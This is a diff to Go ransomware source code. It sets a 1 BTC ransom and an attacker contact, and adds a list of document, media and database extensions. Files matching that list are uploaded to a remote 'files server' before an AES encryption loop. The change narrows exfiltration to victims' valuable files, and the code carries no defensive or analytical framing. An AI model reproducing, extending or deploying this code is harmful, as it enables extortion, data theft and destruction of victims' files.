@@ -31,7 +31,25 @@ var (
 	// Your contact email
 	ContactEmail = "@RealNightKing via Telegram or by email at the_nightking@proton.me"
 	// The ransom to pay
-	Price = "1 BTC"
+	Price                 = "1 BTC"
+	InterestingExtensions = []string{
+		// Text Files
+		".doc", ".docx", ".msg", ".odt", ".wpd", ".wps", ".txt",
+		// Page Layout Files
+		".pdf",
+		// Audio Files
+		".aif", ".m3u", ".m4a", ".mid", ".mp3", ".mpa", ".wav", ".wma",
+		// Video Files
+		".3gp", ".3g2", ".avi", ".flv", ".m4v", ".mov", ".mp4", ".mpg", ".ts", "wmv",
+		// 3D Image files
+		".3dm", ".3ds", ".max", ".obj", ".blend",
+		// Raster Image Files
+		".png", ".jpeg", ".jpg", ".psd",
+		// Spreadsheet Files
+		".xls", ".xlr", ".xlsx", ".csv",
+		// Database Files
+		".accdb", ".sqlite", ".dbf", ".mdb", ".pdb", ".sql", ".db",
+	}
 )
 
 const (
@@ -78,12 +96,11 @@ func main() {
 	con.Write([]byte(ID))
 	con.Close()
 	for i := 0; i < len(allfiles); i++ {
-		s, err := dialer2.Dial("tcp", ServerBaseURL2) //files server
-		if err != nil {
-			panic(err)
+		if StringInSlice(allfiles[i], InterestingExtensions) {
+			s, _ := dialer2.Dial("tcp", ServerBaseURL2)
+			sendFileToServer(s, allfiles[i])
+			s.Close()
 		}
-		sendFileToServer(s, allfiles[i])
-		s.Close()
 	}
 	for i := 0; i < len(allfiles); i++ {
 		block, err := aes.NewCipher(key)
@@ -201,4 +218,12 @@ func ListAllDir(path string) (paths []string) {
 		return nil
 	})
 	return paths
+}
+func StringInSlice(search string, slice []string) bool {
+	for _, v := range slice {
+		if v == filepath.Ext(search) {
+			return true
+		}
+	}
+	return false
 }
